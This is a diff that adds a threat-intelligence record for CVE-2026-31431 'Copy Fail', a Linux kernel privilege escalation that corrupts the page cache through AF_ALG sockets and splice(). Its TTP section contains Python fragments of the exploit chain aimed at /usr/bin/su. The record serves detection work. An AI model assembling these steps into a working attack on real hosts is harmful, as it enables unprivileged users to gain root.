@@ -1,0 +1,69 @@
+title: 'CVE-2026-31431 Copy Fail: Linux Kernel Page Cache Corruption via AF_ALG'
+description: CVE-2026-31431 allows any unprivileged local user to corrupt the Linux
+  kernel page cache via AF_ALG sockets and the authencesn AEAD template to escalate
+  privileges and execute code as root. The exploit chains AF_ALG socket creation,
+  setsockopt configuration, and splice() to write attacker-controlled data into the
+  page cache of readable files such as /usr/bin/su without modifying on-disk content.
+attribution: ''
+malware_families: []
+cves:
+- CVE-2026-31431
+ttps:
+  processes: []
+  command_lines: []
+  powershell: []
+  scripts:
+  - 'import socket
+
+    ctrl_sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
+
+    ctrl_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+
+    key = get_valid_authencesn_key()
+
+    ctrl_sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_KEY, key)
+
+    authsize = 4
+
+    ctrl_sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_AEAD_AUTHSIZE, authsize,)
+
+    op_sock, _ = ctrl_sock.accept()'
+  - 'import os
+
+    target_fd = os.open("/usr/bin/su", os.O_RDONLY)
+
+    pipe_rd, pipe_wr = os.pipe()
+
+    offset = 0
+
+    splice_len = 4096
+
+    os.splice(target_fd, pipe_wr, splice_len, offset_src=offset,)
+
+    os.splice(pipe_rd, op_sock.fileno(), splice_len,)'
+  registry_keys: []
+  image_loads:
+  - algif_aead
+  network_connections: []
+  file_activity:
+  - /usr/bin/su
+  - /etc/pam.d/*
+  - /etc/security/*
+  - /etc/passwd
+  - /usr/bin/*
+  - /usr/sbin/*
+  - /bin/*
+  - /sbin/*
+  - /usr/libexec/*
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls: []
+authors:
+- Datadog Security Research
+reference: https://securitylabs.datadoghq.com/articles/cve-2026-31431-copy-fail-exploit-detection-with-agents
+date_of_publication: May 28, 2026
+file_creation_date: June 01, 2026
